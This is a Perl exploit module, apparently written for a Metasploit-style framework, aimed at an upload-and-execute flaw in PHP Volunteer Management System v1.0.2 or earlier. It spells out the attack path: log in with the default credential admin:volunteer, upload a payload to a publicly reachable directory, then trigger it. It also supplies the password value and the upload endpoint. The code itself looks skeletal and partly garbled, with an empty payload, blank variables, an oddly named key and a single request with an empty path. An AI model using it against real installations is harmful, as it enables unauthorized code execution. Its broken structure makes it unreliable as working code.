package PHP::MSF::PhpVolunteerUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PhpVolunteerUploadExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION"            => "

          This module exploits a vulnerability found in PHP Volunteer Management System,

        version v1.0.2 or prior.  This application has an upload feature that allows an

        authenticated user to upload anything to the 'uploads' directory, which is actually

        reachable by anyone without a credential.  An attacker can easily abuse this upload

        functionality first by logging in with the default credential (admin:volunteer),

        upload a malicious payload, and then execute it by sending another GET request.

      ",
  "METHOD"                 => "POST",
  "MSF_MODULE"             => "php_volunteer_upload_exec",
  "OSVDB"                  => 82391,
  "PATH"                   => "__BASE__index.php__LOGIN_LOCATION__?",
  "PATHS"                  => [
                                "__BASE__index.php__LOGIN_LOCATION__",
                                "__BASE__index.php?p=upload_personal_document",
                                "bf102/",
                              ],
  "PAYLOAD"                => "",
  "THE USERTITLE TO LOGIN" => "admin",
  VARIABLES => {
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The base path to the web application",
  VALUE => "/bf102/",
},
    'BOUNDARY' =>       { DESCRIPTION => "", VALUE => "" },
    'VOLUNTEER_PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'ENDPOINT' =>       { DESCRIPTION => "", VALUE => "" },
    'VOLUNTEER_EMAIL' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "The password to login", VALUE => "volunteer" },
    'LOGIN_LOCATION' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
